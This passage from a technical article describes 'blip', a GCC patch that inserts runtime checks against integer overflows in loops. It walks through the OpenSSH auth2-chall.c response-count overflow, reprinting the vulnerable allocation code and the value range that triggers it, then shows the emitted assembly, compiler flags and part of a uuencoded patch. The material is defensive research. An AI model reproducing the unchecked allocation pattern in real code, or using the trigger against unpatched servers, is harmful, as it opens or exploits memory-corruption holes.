decrement-loop since the modification operation is &quot;--&quot;. The check 
therefore will be (count &gt; limit &amp;&amp; count - limit &gt; MAX_BLIP). Looking at 
the above assembly code, we can see that the loop count is stored in the 
ebx register (Its easy to spot this by looking at the code below label 12 
(L12). This code represent the while condition. It first decrements ebx 
and later compares it with the loop constant). The &lt;blip_check&gt; therefore 
will utilize the ebx register for the check.

----[ 7.2 - OpenSSH auth

--[ Vulnerability info	

The OpenSSH Vulnerability is an example of an integer overflow bug, which 
results in a miscalculated allocation size. The following is a snippet of 
the vulnerable code:

OpenSSH auth2-chall.c : input_userauth_info_response()

01 nresp = packet_get_int();

&lt;some code here ..&gt;

02 response = xmalloc(nresp * sizeof(char*));
03 for(i = 0; i &lt; nresp; i++)
04	response[i] = packet_get_string(NULL);

At line 01 the code reads an integer into an unsigned variable. Later the 
code allocates an array with nresp entries. The problem is that nresp * 
sizeof(char*) is an expression that may overflow. Therefore sending nresp 
bigger than 0x40000000 allows allocation of a small buffer that can be 
later overflowed by the assignment in line 04.

--[ Testing the patch

To compile the OpenSSH package with the -fblip enabled, one may add -
fblip to the CFLAGS definition at Makefile.in (i.e. CFLAGS=@CFLAGS@ -
fblip)

Any attempt to send a large number of responses after compiling OpenSSH 
with the blip patch will end up with OpenSSH executing the 
__blip_violation. 

The following is snippet of the vulnerable function. 

static void
input_userauth_info_response(int type, u_int32_t seq, void *ctxt)
{
	Authctxt *authctxt = ctxt;
	KbdintAuthctxt *kbdintctxt;
	int i, authenticated = 0, res, len;
	u_int nresp;
	char **response = NULL, *method;

	&lt;omitted code&gt;

	nresp = packet_get_int();

	if (nresp != kbdintctxt-&gt;nreq)
		fatal(&quot;input_userauth_info_response: wrong number of 
replies&quot;);

	if (nresp &gt; 0) {
		
		-----------------------------------------
			 **  Vulnerable code **
		-----------------------------------------

		response = xmalloc(nresp * sizeof(char*));
		for (i = 0; i &lt; nresp; i++)
			response[i] = packet_get_string(NULL);


	}

	&lt;omitted code&gt;
}

The above function is translated to the following assembly code if 
compiled with the -fblip protection.(In order to make blip modification 
readable, the code was compiled using -O instead of using -O2, which will 
reorder basic blocks)

	.type	input_userauth_info_response,@function
input_userauth_info_response:

	movl	-16(%ebp), %eax
	movl	$0, 4(%eax)
	call	packet_get_int
	movl	%eax, %esi
	movl	-20(%ebp), %edx
	cmpl	12(%edx), %eax
	je	.L111
	movl	$.LC15, (%esp)
	call	fatal
.L112:
	testl	%esi, %esi
	je	.L113
	leal	0(,%esi,4), %eax
	movl	%eax, (%esp)
	call	xmalloc
	movl	%eax, -32(%ebp)
	movl	$0, %ebx
	cmpl	$0, %esi
	jbe	.L115
	cmpl	$268435456, %esi          ------------------------
	jbe	.L115
	movl	%esi, (%esp)                   Blip Check
	call	__blip_violation
.L115:                                 ------------------------
	cmpl	%esi, %ebx
	jae	.L113
.L120:
	movl	$0, (%esp)
	call	packet_get_string
	movl	-32(%ebp), %ecx
	movl	%eax, (%ecx,%ebx,4)
	incl	%ebx
	cmpl	%esi, %ebx
	jb	.L120

The blip patch identified the for-loop as a count-loop and injected a 
code to direct the flow to the _blip_violation handler in the case that 
the limit (i.e. nresp) is bigger then the BLIP_MAX. Therefore if nresp 
value will be high enough to trigger an overflow in the call to xmalloc, 
it will also be high enough to get caught by the &lt;blip_check&gt;.

--[ 8 - Appendix B - Using blip  

To enable the blip patch one should first add the -fblip flag when 
executing the gcc compiler. 

The blip patch will attempt to emit the &lt;blip_check&gt; whenever it seems 
possible to do so. The patch will silently ignore all loops or calls, 
which cannot be protected. In order to see the ignored loops one can use 
one of the following warning flags, which will also provide a message 
describing the reason for ignoring the specific loop.

Warning flags:
- blip_for_not_emit - report ignored for loops.
- blip_while_not_emit - report ignored while loops.
- blip_call_not_emit - report ignored calls to loop like function.

A reason for ignoring a loop will be one of the following:
- Loop variables are less then 4 bytes long
- for init is not an expression
- call to function is made using a pointer to function
- call parameters have side effects. Reusing the expression may cause 
unexpected results
- loop condition is too complex in order to find the loop variables
- non of loop variables is modified (not enough info to make check)
- both loop var are modified
- condition is too complex

The blip patch is also capable of reporting check statistics. Using the 
-fblip_stat one can make the blip patch to print out statistical 
information about amount of loops processed and the amount of loops that 
where successfully checked. 

The following command line will compile the first sample code. The output 
of the compilation will follow

$ gcc -o sample -fblip -fblip_stat -O sample.c

-=] Blip statistics (checks emits)
Total:	1/100%		1/100%
for:	1/100%		1/100%
while:	0/0%		0/0%
calls:	0/0%		0/0%
-=] End Blip Statistics


begin 640 blip.patch
M9&amp;EF9B`M3G5R(&amp;=C8RTS+C(O9V-C+TUA:V5F:6QE+FEN(&amp;=C8RTS+C(M8FQI
M&lt;&quot;]G8V,O36%K969I;&amp;4N:6X-&quot;BTM+2!G8V,M,RXR+V=C8R]-86ME9FEL92YI
M;@E4:&#039;4@36%Y(#(S(#$P.C4W.C(Q(#(P,#(-&quot;BLK*R!G8V,M,RXR+6)L:7`O
M9V-C+TUA:V5F:6QE+FEN&quot;4UO;B!$96,@(#(@,3DZ-#(Z,SD@,C`P,@T*0$`@
M+3&lt;R-RPW(&quot;LW,C&lt;L-R!`0`T*(&quot;!S:6)C86QL+F\@&lt;VEM&lt;&amp;QI9GDM&lt;G1X+F\@
M&lt;W-A+F\@&lt;W-A+6-C&lt;&quot;YO(&#039;-S82UD8V4N;R!S=&amp;UT+F\)7`T*(&quot;!S=&amp;]R+6QA
M&gt;6]U=&quot;YO(&#039;-T&lt;FEN9W!O;VPN;R!T:6UE=F%R+F\@=&amp;]P;&amp;5V+F\@=&#039;)E92YO
M(&#039;1R964M9&#039;5M&lt;&quot;YO(`E&lt;#0H@(&#039;1R964M:6YL:6YE+F\@=6YR;VQL+F\@=F%R
M87-M+F\@=F%R&lt;F%Y+F\@=F5R&lt;VEO;BYO(&#039;9M&lt;V1B9V]U=&quot;YO(&#039;AC;V9F;W5T
M+F\@7`T*+2`D*$=&#039;0RD@)&quot;AO=71?;V)J96-T7V9I;&amp;4I(&quot;0H15A44D%?3T)*
M4RD-&quot;BL@8FQI&lt;&quot;YO(&quot;0H1T=#*2`D*&amp;]U=%]O8FIE8W1?9FEL92D@)&quot;A%6%12
M05]/0DI3*0T*(`T*($)!0TM%3D0@/2!M86EN+F\@;&amp;EB8F%C:V5N9&quot;YA#0H@
M#0I`0&quot;`M-S8X+#&lt;@*S&lt;V.&quot;PX($!`#0H@#0H@3$E&quot;,D953D-37S(@/2!?9FQO
M871D:7AF(%]F:7AU;G-X9G-I(%]F:7AT9F1I(%]F:7AU;G-T9F1I(%]F;&amp;]A
M=&amp;1I=&amp;8@7`T*(&quot;`@(&quot;!?8VQE87)?8V%C:&amp;4@7W1R86UP;VQI;F4@7U]M86EN
M(%]E&gt;&amp;ET(%]A8G-V&lt;VDR(%]A8G-V9&amp;DR(%]A9&amp;1V&lt;VDS(%P-&quot;BT@(&quot;`@7V%D
M9&#039;9D:3,@7W-U8G9S:3,@7W-U8G9D:3,@7VUU;&#039;9S:3,@7VUU;&#039;9D:3,@7VYE
M9W9S:3(@7VYE9W9D:3(@7V-T;W)S#0HK(&quot;`@(%]A9&amp;1V9&amp;DS(%]S=6)V&lt;VDS
M(%]S=6)V9&amp;DS(%]M=6QV&lt;VDS(%]M=6QV9&amp;DS(%]N96=V&lt;VDR(%]N96=V9&amp;DR
M(%]C=&amp;]R&lt;R!&lt;#0HK&quot;5]B;&amp;EP7W9I;VQA=&amp;EO;@T*(`T*(&quot;,@1&amp;5F:6YE9&quot;!I
M;B!L:6)G8V,R+F,L(&amp;EN8VQU9&amp;5D(&amp;]N;&#039;D@:6X@=&amp;AE(&#039;-T871I8R!L:6)R
M87)Y+@T*($Q)0C)&amp;54Y#4U]35&quot;`](%]E&lt;&#039;)I;G1F(%]B8B!?7V=C8U]B8VUP
M#0ID:69F(&quot;U.=7(@9V-C+3,N,B]G8V,O8FQI&lt;&quot;YC(&amp;=C8RTS+C(M8FQI&lt;&quot;]G
M8V,O8FQI&lt;&quot;YC#0HM+2T@9V-C+3,N,B]G8V,O8FQI&lt;&quot;YC&quot;5=E9&quot;!$96,@,S$@
M,38Z,#`Z,#`@,3DV.0T**RLK(&amp;=C8RTS+C(M8FQI&lt;&quot;]G8V,O8FQI&lt;&quot;YC&quot;4UO
M;B!$96,@(#(@,3DZ-#(Z,SD@,C`P,@T*0$`@+3`L,&quot;`K,2PX,S4@0$`-&quot;BLO
M*@T-&quot;BL@*B`@(&quot;!4:&amp;ES(&amp;9I;&amp;4@:7,@&lt;&amp;%R=&quot;!O9B!&#039;3E4@0T,N#0T**R`J
M#0T**R`J(&quot;`@($=.52!#0R!I&lt;R!F&lt;F5E(&#039;-O9G1W87)E.R!Y;W4@8V%N(&#039;)E
M9&amp;ES=&#039;)I8G5T92!I=&quot;!A;F0O;W(@;6]D:69Y#0T**R`J(&quot;`@(&amp;ET(&#039;5N9&amp;5R
M(&#039;1H92!T97)M&lt;R!O9B!T:&amp;4@1TY5($=E;F5R86P@4&#039;5B;&amp;EC($QI8V5N&lt;V4@
M87,@&lt;&#039;5B;&amp;ES:&amp;5D(&amp;)Y#0T**R`J(&quot;`@(&#039;1H92!&amp;&lt;F5E(%-O9G1W87)E($9O
M=6YD871I;VX[(&amp;5I=&amp;AE&lt;B!V97)S:6]N(#(L(&amp;]R(&quot;AA=&quot;!Y;W5R(&amp;]P=&amp;EO
M;BD-#0HK(&quot;H@(&quot;`@86YY(&amp;QA=&amp;5R(&#039;9E&lt;G-I;VXN#0T**R`J#0T**R`J(&quot;`@
M($=.52!#0R!I&lt;R!D:7-T&lt;FEB=71E9&quot;!I;B!T:&amp;4@:&amp;]P92!T:&amp;%T(&amp;ET(&#039;=I
M;&amp;P@8F4@=7-E9G5L+`T-&quot;BL@*B`@(&quot;!B=70@5TE42$]55&quot;!!3ED@5T%24D%.
M5%D[(&#039;=I=&amp;AO=70@979E;B!T:&amp;4@:6UP;&amp;EE9&quot;!W87)R86YT&gt;2!O9@T-&quot;BL@
M*B`@(&quot;!-15)#2$%.5$%&quot;24Q)5%D@;W(@1DE43D534R!&amp;3U(@02!005)424-5
M3$%2(%!54E!/4T4N(&quot;!3964@=&amp;AE#0T**R`J(&quot;`@($=.52!&#039;96YE&lt;F%L(%!U
M8FQI8R!,:6-E;G-E(&amp;9O&lt;B!M;W)E(&amp;1E=&amp;%I;&#039;,N#0T**R`J#0T**R`J(&quot;`@
M(%EO=2!S:&amp;]U;&amp;0@:&amp;%V92!R96-E:79E9&quot;!A(&amp;-O&lt;&#039;D@;V8@=&amp;AE($=.52!&#039;
M96YE&lt;F%L(%!U8FQI8R!,:6-E;G-E#0T**R`J(&quot;`@(&amp;%L;VYG(&#039;=I=&amp;@@1TY5
M($-#.R!S964@=&amp;AE(&amp;9I;&amp;4@0T]064E.1RX@($EF(&amp;YO=&quot;P@=W)I=&amp;4@=&amp;\-
M#0HK(&quot;H@(&quot;`@=&amp;AE($9R964@4V]F=&#039;=A&lt;F4@1F]U;F1A=&amp;EO;BP@-3D@5&amp;5M
M&lt;&amp;QE(%!L86-E(&quot;T@4W5I=&amp;4@,S,P+`T-&quot;BL@*B`@(&quot;!&quot;;W-T;VXL($U!(#`R
M,3$Q+3$S,#&lt;L(%5302X@(&quot;HO#0T**PT-&quot;BLC:6YC;&#039;5D92`B8V]N9FEG+F@B
M#0T**R-I;F-L=61E(&quot;)S&gt;7-T96TN:&quot;(-#0HK(VEN8VQU9&amp;4@(FUA8VAM;V1E
M+F@B#0T**R-I;F-L=61E(&quot;)R=&amp;PN:&quot;(-#0HK(VEN8VQU9&amp;4@(G1R964N:&quot;(-
M#0HK(VEN8VQU9&amp;4@(G1O&lt;&amp;QE=BYH(@T-&quot;BLC:6YC;&#039;5D92`B8FQI&lt;&quot;YH(@T-
M&quot;BLC:6YC;&#039;5D92`B9FQA9W,N:&quot;(-#0HK(VEN8VQU9&amp;4@(F,M8V]M;6]N+F@B
M#0T**PT-&quot;BLO*B!T:&amp;ES(&#039;-T&lt;G5C=&quot;!W:6QL(&amp;AE;&#039;`@86QL(&amp;-H96-K7VQO
M;W!?;&amp;EM:70@9G5N8W1I;VYT:6]N#0T**R`J(&#039;1O(&amp;-O;6UU;FET8V%T92X-
M#0HK(&quot;H@4VEN8V4@=&amp;AE(&amp;-O;7!I;&amp;5R(&amp;ES(&#039;-I;F=L92!T:&#039;)E860L(&amp;%N
M9&quot;!T:&amp;4@8FQI&lt;&quot;!C:&amp;5C:W,@87)E(&amp;%L;&#039;=A&gt;7,@#0T**R`J(&#039;-T871L97-S
M+&quot;!T:&amp;%N(&amp;ET&lt;R!S869E(&#039;1O(&#039;5S92!T:&amp;ES(&#039;-T&lt;G5C=&quot;!A&lt;R!G;&amp;]B86P@
M:6YS=&amp;5A9&quot;!O9B!P87-S:6YG#0T**R`J(&amp;ET(&amp;%L;&quot;!A&lt;F]U;F0N(&quot;HO#0T*
M*PT-&quot;BML;V]P7VQI;6ET7W,@;&amp;]O&lt;%]L:6UI=#L-#0HK#0T**R\J(&#039;-A=F4@
M9G5N8W1I;VX@=&amp;\@8F4@8VAE8VME9&quot;!A9V%I;G-T(&amp;EN=&amp;5G97(@97AP;&amp;]I
M=&quot;`J+PT-&quot;BML;V]P7VQI:V5?&lt;R`);&amp;]O&lt;%]L:6ME&lt;UM=/7L-#0HK&quot;7LB;65M
M8W!Y(BPR?2P-#0HK&quot;7LB;65M;6]V92(L,GTL#0T**PE[(FUE;7-E=&quot;(L,GTL
M#0T**PE[(FUE;6-C&lt;&#039;DB+#-]+`T-&quot;BL)&gt;R)B8V]P&gt;2(L,GTL#0T**PE[(F)Z
M97)O(BPQ?2P-#0HK&quot;7LB&lt;W=A8B(L,GTL#0T**PE[(B(L,&#039;T)#0T**WT[#0T*
M*PT-&quot;BLO*B!G;&amp;]B86P@9F]R(&amp;)L:7`@&lt;W1A=&amp;ES=&amp;EC&lt;R`J+PT-&quot;BMB;&amp;EP
M7W-T871I&lt;W1I8W-?&lt;R`@(&amp;)L:7!?&lt;W1A=#U[,&quot;PP+#`L,&quot;PP+#`L,&quot;PP?3L-
M#0HK#0T**R-D969I;F4@4$52*&#039;@L&gt;2D@&quot;7D@/R`H&gt;&quot;`J(#$P,&quot;DO&gt;2`Z(#`-
M#0HK#0T**R\J(&#039;!R:6YT(&amp;)L:7`@&lt;W1A=&amp;ES=&amp;EC&lt;R!T;R!T:&amp;4@&lt;W1D97)R
M(&quot;HO#0T**W9O:60@#0T**V)L:7!?&lt;W1A=%]P&lt;FEN=&quot;AF&lt;&quot;D-#0HK&quot;49)3$4J
M&quot;69P.PT-&quot;BM[#0T**PT-&quot;BL):68H(69L86=?8FQI&lt;&quot;!\?`T-&quot;BL)&quot;2%F;&amp;%G
M7V)L:7!?&lt;W1A=&quot;D@&lt;F5T=7)N.PT-&quot;BL)#0T**PEI9BAF&lt;&quot;`]/2`P*2`-#0HK
M&quot;0EF&lt;&quot;`](&#039;-T9&amp;5R&lt;CL-#0HK&quot;0T-&quot;BL-#0HK&quot;69P&lt;FEN=&amp;8H9G`L(EQN+3U=
M($)L:7`@&lt;W1A=&amp;ES=&amp;EC&lt;R`H8VAE8VMS(&amp;5M:71S*5QN(BD[#0T**PD-#0HK
M&quot;69P&lt;FEN=&amp;8H9G`L(E1O=&amp;%L.EQT)60O)60E)5QT7&#039;0E9&quot;\E9&quot;4E7&amp;XB+`T-
M&quot;BL)&quot;0EB;&amp;EP7W-T870N=&amp;]T86Q?8VAE8VMS+#$P,&quot;P-#0HK&quot;0D)8FQI&lt;%]S
M=&amp;%T+G1O=&amp;%L7V5M:71S+`T-&quot;BL)&quot;0E015(H8FQI&lt;%]S=&amp;%T+G1O=&amp;%L7V5M
M:71S+&amp;)L:7!?&lt;W1A=&quot;YT;W1A;%]C:&amp;5C:W,I*3L)&quot;0D-#0HK&quot;0D)#0T**PEF
M&lt;&#039;)I;G1F*&amp;9P+&quot;)F;W(Z7&#039;0E9&quot;\E9&quot;4E7&#039;1&lt;=&quot;5D+R5D)25&lt;;B(L#0T**PD)
M&quot;6)L:7!?&lt;W1A=&quot;YF;W)?8VAE8VMS+`T-&quot;BL)&quot;0E015(H8FQI&lt;%]S=&amp;%T+F9O
M&lt;E]C:&amp;5C:W,L8FQI&lt;%]S=&amp;%T+G1O=&amp;%L7V-H96-K&lt;RDL#0T**PD)&quot;6)L:7!?
M&lt;W1A=&quot;YF;W)?96UI=&#039;,L#0T**PD)&quot;5!%4BAB;&amp;EP7W-T870N9F]R7V5M:71S
M+&amp;)L:7!?&lt;W1A=&quot;YF;W)?8VAE8VMS*2D[&quot;0D)#0T**PD)&quot;0T-&quot;BL)9G!R:6YT
M9BAF&lt;&quot;PB=VAI;&amp;4Z7&#039;0E9&quot;\E9&quot;4E7&#039;1&lt;=&quot;5D+R5D)25&lt;;B(L#0T**PD)&quot;6)L
M:7!?&lt;W1A=&quot;YW:&amp;EL95]C:&amp;5C:W,L#0T**PD)&quot;5!%4BAB;&amp;EP7W-T870N=VAI
M;&amp;5?8VAE8VMS+&amp;)L:7!?&lt;W1A=&quot;YT;W1A;%]C:&amp;5C:W,I+`T-&quot;BL)&quot;0EB;&amp;EP
M7W-T870N=VAI;&amp;5?96UI=&#039;,L#0T**PD)&quot;5!%4BAB;&amp;EP7W-T870N=VAI;&amp;5?
M96UI=&#039;,L8FQI&lt;%]S=&amp;%T+G=H:6QE7V-H96-K&lt;RDI.PD)&quot;0T-&quot;BL)&quot;0D-#0HK
M&quot;69P&lt;FEN=&amp;8H9G`L(F-A;&amp;QS.EQT)60O)60E)5QT7&#039;0E9&quot;\E9&quot;4E7&amp;XB+`T-
M&quot;BL)&quot;0EB;&amp;EP7W-T870N8V%L;%]C:&amp;5C:W,L#0T**PD)&quot;5!%4BAB;&amp;EP7W-T
M870N8V%L;%]C:&amp;5C:W,L8FQI&lt;%]S=&amp;%T+G1O=&amp;%L7V-H96-K&lt;RDL#0T**PD)
M&quot;6)L:7!?&lt;W1A=&quot;YC86QL7V5M:71S+`T-&quot;BL)&quot;0E015(H8FQI&lt;%]S=&amp;%T+F-A
M;&amp;Q?96UI=&#039;,L8FQI&lt;%]S=&amp;%T+F-A;&amp;Q?8VAE8VMS*2D[&quot;0D)#0T**PT-&quot;BL)
M9G!R:6YT9BAF&lt;&quot;PB+3U=($5N9&quot;!&quot;;&amp;EP(%-T871I&lt;W1I8W-&lt;;B(I.PT-&quot;BM]
M#0T**PT-&quot;BLO*B!P&lt;FEN=&quot;!A(&#039;=A&lt;FYI;F&lt;@;65S&lt;V%G92P@;VYL&gt;2!D;R!S
M;R!I9B!T:&amp;4@&lt;FEG:&#039;0@=V%R;FYI;F&lt;@9FQA9R!I&lt;R!T=7)N960@#0T**R`J
M(&amp;]N+B`J+PT-&quot;BL-#0HK=F]I9`T-&quot;BMB;&amp;EP7W=A&lt;FYI;F&lt;H=V%R;E]I9&quot;QM
M97-S86=E*0T-&quot;BL)96YU;2!B;&amp;EP7W=A&lt;FYI;F=S(&#039;=A&lt;FY?:60[#0T**PEC
M;VYS=&quot;!C:&amp;%R*@EM97-S86=E.PT-&quot;BM[#0T**PT-&quot;BL):68H=V%R;E]I9&quot;`]
M/2!314Q&amp;7T-(14-+*7L-#0HK&quot;0ES=VET8V@H5%)%15]#3T1%(&quot;AL;V]P7VQI
M;6ET+G-T;70I*7L-#0HK&quot;0D)8V%S92!&amp;3U)?4U1-5#H-#0HK&quot;0D)&quot;7=A&lt;FY?
M:60@/2!.15]&amp;3U([#0T**PD)&quot;0EB&lt;F5A:SL-#0HK#0T**PD)&quot;6-A&lt;V4@5TA)
M3$5?4U1-5#H-#0HK&quot;0D)&quot;7=A&lt;FY?:60@/2!.15]72$E,13L-#0HK&quot;0D)&quot;6)R
M96%K.PT-&quot;BL-#0HK&quot;0D)8V%S92!#04Q,7T584%(Z#0T**PD)&quot;6-A&lt;V4@041$
M4E]%6%!2.@T-&quot;BL)&quot;0D)=V%R;E]I9&quot;`]($Y%7T-!3$P[#0T**PD)&quot;0EB&lt;F5A
M:SL-#0HK#0T**PD)&quot;61E9F%U;&#039;0Z&lt;F5T=7)N.PT-&quot;BL)&quot;7T-#0HK&quot;7T-#0HK
M#0T**PES=VET8V@H=V%R;E]I9&quot;E[#0T**PD)8V%S92!.15]&amp;3U(Z#0T**PD)
M&quot;6EF*&quot;%W87)N7V)L:7!?9F]R7VYO=%]E;6ET*2!R971U&lt;FX[#0T**PD)&quot;6)R
M96%K.PT-&quot;BL)&quot;6-A&lt;V4@3D5?5TA)3$4Z#0T**PD)&quot;6EF*&quot;%W87)N7V)L:7!?
M=VAI;&amp;5?;F]T7V5M:70I(&#039;)E=&#039;5R;CL-#0HK&quot;0D)8G)E86L[#0T**PD)8V%S
M92!.15]#04Q,.@T-&quot;BL)&quot;0EI9B@A=V%R;E]B;&amp;EP7V-A;&amp;Q?;F]T7V5M:70I
M(&#039;)E=&#039;5R;CL-#0HK&quot;0D)8G)E86L[#0T**PT-&quot;BL)&quot;61E9F%U;&#039;0Z(&#039;)E=&#039;5R
M;CL-#0HK&quot;7T-#0HK#0T**PT-&quot;BL)=V%R;FEN9RAM97-S86=E*3L-#0HK?0T-
M&quot;BL-#0HK#0T**R\J(&amp;)U:6QD(&amp;$@8V%L;&quot;!T;R!T:&amp;4@8FQI&lt;%]V:6]L871I
M;VX@9G5N8W1I;VXN(&#039;5S:6YG(&#039;1H92!A&lt;F&lt;@97AP(&amp;%S(&#039;1H92`-#0HK(&quot;H@
M&lt;&amp;%R86UE=&amp;5R(&amp;9O&lt;B!T:&amp;ES(&amp;-A;&amp;PN(&quot;HO#0T**PT-&quot;BMT&lt;F5E#0T**V)L
M:7!?8G5I;&amp;1?=FEO;&amp;%T:6]N7V-A;&amp;PH87)G*0T-&quot;BL)=&#039;)E92!A&lt;F&lt;[#0T*
M*WL-#0HK#0T**PET&lt;F5E&quot;7!A&lt;F%M&lt;SL-#0HK&quot;71R964)97AP.PT-&quot;BL)=&#039;)E
M90EB;&amp;EP7V9U;F-?9&amp;5C;#U.54Q,.PT-&quot;BL-#0HK&quot;71R964)8FQI&lt;%]V:6]L
M871I;VY?9&amp;5C;&quot;`]($Y53$P[#0T**PD-#0HK&quot;6)L:7!?=FEO;&amp;%T:6]N7V1E
M8VP@/0T-&quot;BL)&quot;6)U:6QD7V1E8VP@*$953D-424].7T1%0TPL(&amp;=E=%]I9&amp;5N
M=&amp;EF:65R*&quot;)?7V)L:7!?=FEO;&amp;%T:6]N(BDL#0T**PD)&quot;0EB=6EL9%]F=6YC
M=&amp;EO;E]T&gt;7!E(&quot;AI;G1E9V5R7W1Y&lt;&amp;5?;F]D92Q.54Q,7U12144I*3L-#0HK
M#0T**PE$14-,7T%25$E&amp;24-)04P@*&amp;)L:7!?=FEO;&amp;%T:6]N7V1E8VPI(#T@
M,3L-#0HK&quot;41%0TQ?15A415).04P@*&amp;)L:7!?=FEO;&amp;%T:6]N7V1E8VPI(#T@
M,3L-#0HK&quot;41%0TQ?24Y,24Y%(&quot;AB;&amp;EP7W9I;VQA=&amp;EO;E]D96-L*2`](#`[
M#0T**PE44D5%7U!50DQ)0R`H8FQI&lt;%]V:6]L871I;VY?9&amp;5C;&quot;D@/2`Q.PT-
M&quot;BL)#0T**PEB;&amp;EP7V9U;F-?9&amp;5C;&quot;`](&amp;)L:7!?=FEO;&amp;%T:6]N7V1E8VP[
M#0T**PT-&quot;BL)&lt;&amp;%R86US(&quot;`](&#039;1R965?8V]N&lt;R`H3E5,3&quot;QA&lt;F&lt;L3E5,3&quot;D[
M#0T**PEI9B@A&lt;&amp;%R86US*2!R971U&lt;FX@3E5,3#L-#0HK&quot;0T-&quot;BL)+RH@8VAE
M8VL@:68@9G5N8W1I;VX@9&amp;5C;&quot;XN*B\)#0T**PEI9BA44D5%7T-/1$4@*&amp;)L
M:7!?9G5N8U]D96-L*2`A/2!&amp;54Y#5$E/3E]$14-,*7L-#0HK&quot;0ER971U&lt;FX@
M3E5,3#L-#0HK&quot;7T-#0HK&quot;0D)#0T**PEE&gt;&#039;`@/2!B=6EL9%]F=6YC=&amp;EO;E]C
M86QL*&amp;)L:7!?9G5N8U]D96-L+&#039;!A&lt;F%M&lt;RD[#0T**PD-#0HK&quot;7)E=&#039;5R;B!E
M&gt;&#039;`[#0T**WT-#0HK#0T**R\J(`E#&lt;F5A=&amp;4@82!C:&amp;5C:R!E&gt;&#039;`@9F]R(&#039;1H
M92!B;&amp;EP(&amp;-O;F1I=&amp;EO;B!T:&amp;4@97AP(&#039;=I;&amp;P@8F4@;V8@0T].1%]%6%!2
M(`T-&quot;BL@*B`)=&#039;EP92P@86YD(&#039;=I;&amp;P@:&amp;%V92!T:&amp;4@9F]L;&amp;]W:6YG(&amp;9O
M&lt;FUA=#H-#0HK(&quot;H@&quot;2@H;W`Q(#X@;W`R*2`F)B`H*&amp;]P,2UO&lt;#(I(#X@;6%X
M7VQI;6ET*2D@(#\@8FQI&lt;%]V:6]L871I;VXH*2`Z(&amp;5X&lt;#L@(`T-&quot;BL@*@T-
M&quot;BL@*B`)=VAE&lt;F4@;W`Q+V]P,B!A&lt;F4@8V]U;F0@86YD(&amp;QI;6ET+&quot;!A;F0@
M=&amp;AE:7(@;W)D97(@:6X@=&amp;AE(&amp;5X&lt;&amp;5R&lt;W-I;VX@:7,-#0HK(&quot;H@&quot;2!D969I
M;F1E9&quot;!B&gt;2!T:&amp;4@9&amp;ER96-T:6]N(&amp;]F(&#039;1H92!L;V]P(`T-&quot;BL@*@T-&quot;BL@
M*B`)($%S(&amp;$@;F]T92P@:2!C;W5L9&quot;!H879E(&amp;%D9&quot;!S;VUE(&amp;5X=&#039;)A(&amp;QO
M9VEC(&#039;1O(&amp;5L:6UI;F%T92!T:&amp;4@8V]M&lt;&amp;QE&gt;&quot;`-#0HK(&quot;H@&quot;2!C:&amp;5C:R!I
M9B!T:&amp;4@;&amp;EM:70O8V]U;G0@87)E(&amp;-O;G-T86YT&lt;RP@8G5T(&#039;-I;F-E(&#039;1H
M92!O&lt;&#039;1I;6EZ97(@8V%N(`T-&quot;BL@*B`)(&#039;!I8VL@=&amp;AA=&quot;!U&lt;&quot;!I=&quot;!W:6QL
M(&amp;)E(&#039;)E9&#039;5N9&amp;%N=&quot;!A;F0@82!S;W5R8V4@;V8@;6ES=&amp;%K97,N*B\-#0HK
M#0T**W1R964-#0HK8FQI&lt;%]B=6EL9%]C:&amp;5C:U]E&gt;&#039;`H97AP*0T-&quot;BL)=&#039;)E
M90EE&gt;&#039;`[#0T**WL-#0HK#0T**PET&lt;F5E&quot;71T(#T@=F]I9%]T&gt;7!E7VYO9&amp;4[
M#0T**PET&lt;F5E&quot;6]P7W1T.PT-&quot;BL)=&#039;)E90EB;&amp;EP7W9I;VQA=&amp;EO;E]C86QL
M+&amp;)L:7!?;6%X.PT-&quot;BL)#0T**PDO*B!A;&amp;P@97AP&lt;F5S&lt;VEO;B!N965D960@
M9F]R(&#039;1H92!C;VYD=&amp;EO;B!C&lt;F5A=&amp;EO;B`J+PT-&quot;BL-#0HK&quot;71R964@(&quot;`@
M;W!?9W1?;6%X.PD)+RH@;W`@/B!M87@@*B\)#0T**PET&lt;F5E&quot;6]P,5]G=%]O
M&lt;#([(`DO*B`H;W`Q(#X@;W`R*2`J+PT-&quot;BL)=&#039;)E90EM:6YU&lt;SL@&quot;0D)+RH@
M*&amp;]P,2UO&lt;#(I(&quot;HO#0T**PET&lt;F5E&quot;6UI;G5S7V=T7VUA&gt;#L@&quot;2\J(&quot;@H;W`Q
M+6]P,BD@/B!M87A?;&amp;EM:70I(&quot;HO#0T**PET&lt;F5E&quot;71?86YD:68[(`D)+RH@
M=&amp;AE(&quot;@I)B8H*2`J+PT-&quot;BL-#0HK&quot;71R964)8V]U;G0[&quot;0D)+RH@=&amp;AE(&amp;-A
M;&amp;-U;&amp;%T960@8V]U;G0@;&amp;]O&lt;&quot;`J+PD-#0HK&quot;71R964)8V]N9%]T97-T.PD)
M+RH@=&amp;AE(&amp;-O;F1I=&amp;EO;B!T97-T(&quot;HO#0T**PET&lt;F5E&quot;6-O;F1?97AP.PD)
M+RH@5&amp;AE(&#039;=H;VQE(&amp;)L:7`@8V]N9&amp;ET:6]N(&quot;HO#0T**PD-#0HK&quot;6EF*&amp;5X
M&lt;&quot;D)=&#039;0@/2!44D5%7U194$4@*&amp;5X&lt;&quot;D[#0T**PD)#0T**PEO&lt;%]T=&quot;`](&amp;QO
M;F=?=6YS:6=N961?=&#039;EP95]N;V1E.PT-&quot;BL-#0HK&quot;6)L:7!?;6%X(#T@8G5I
M;&amp;1?:6YT7S(@*$),25!?34%8+#`I.PT-&quot;BL)5%)%15]465!%(&quot;AB;&amp;EP7VUA
M&gt;&quot;D@/2!O&lt;%]T=#L-#0HK#0T**PT-&quot;BL)+RH@:68@;&amp;]O&lt;&quot;!C;W5N=&amp;5R(&amp;]R
M(&amp;QO;W`@;&amp;EM:70@87)E(&#039;-M86QL97(@=&amp;AE;B`T8GET92!I;G1S(`T-&quot;BL)
M(&quot;H@9&amp;]N=&quot;!E=F5N(&amp;)O=&amp;AE&lt;B!T;R!C&lt;F5A=&amp;4@8VAE8VL@97AP&lt;F5S&lt;VEO
M;BX@*B\-#0HK&quot;6EF*&quot;%44D5%7U194$4H;&amp;]O&lt;%]L:6UI=&quot;YC;W5N=&amp;5R*2!\
M?`T-&quot;BL)&quot;5194$5?4%)%0TE324].*%12145?5%E012AL;V]P7VQI;6ET+F-O
M=6YT97(I*2`\(#,R(&#039;Q\#0T**PD)(512145?5%E012AL;V]P7VQI;6ET+FQI
M;6ET*2!\?`T-&quot;BL)&quot;5194$5?4%)%0TE324].*%12145?5%E012AL;V]P7VQI
